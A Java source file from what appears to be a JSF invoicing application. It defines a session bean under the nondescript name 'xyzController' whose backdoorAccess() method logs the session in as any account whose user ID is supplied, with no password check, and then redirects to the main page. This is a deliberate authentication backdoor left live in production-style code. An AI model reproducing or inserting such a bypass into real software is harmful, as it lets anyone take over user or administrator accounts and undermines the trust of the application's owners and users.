/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.khoders.im.admin.jbeans;

import com.khoders.im.admin.Pages;
import com.khoders.im.admin.listener.AppSession;
import com.khoders.invoicemaster.entities.master.UserAccount;
import com.khoders.resource.jpa.CrudApi;
import com.khoders.resource.utilities.Msg;
import java.io.Serializable;
import javax.enterprise.context.SessionScoped;
import javax.faces.application.FacesMessage;
import javax.faces.context.FacesContext;
import javax.inject.Inject;
import javax.inject.Named;
import org.omnifaces.util.Faces;

/**
 *
 * @author pascal
 */
@Named("xyzController")
@SessionScoped
public class XyzController implements Serializable
{

    @Inject
    private AppSession appSession;
    @Inject
    private CrudApi crudApi;

    private String userId;

    public String backdoorAccess()
    {
        try
        {
            UserAccount userAccount = crudApi.find(UserAccount.class, userId);
            System.out.println("ID -- " + userId);
            if (userAccount == null)
            {
                return null;
            }
            initLogin(userAccount);
        } catch (Exception e)
        {
            e.printStackTrace();
        }
        return null;
    }

    public String initLogin(UserAccount account)
    {
        try
        {

            if (account == null)
            {
                FacesContext.getCurrentInstance().addMessage(null,
                        new FacesMessage(FacesMessage.SEVERITY_ERROR, Msg.setMsg("Wrong username or Password"), null));
                return null;
            }

            appSession.login(account);

            Faces.redirect(Pages.index);

        } catch (Exception e)
        {
            e.printStackTrace();
        }

        return null;
    }

    public String getUserId()
    {
        return userId;
    }

    public void setUserId(String userId)
    {
        this.userId = userId;
    }

}
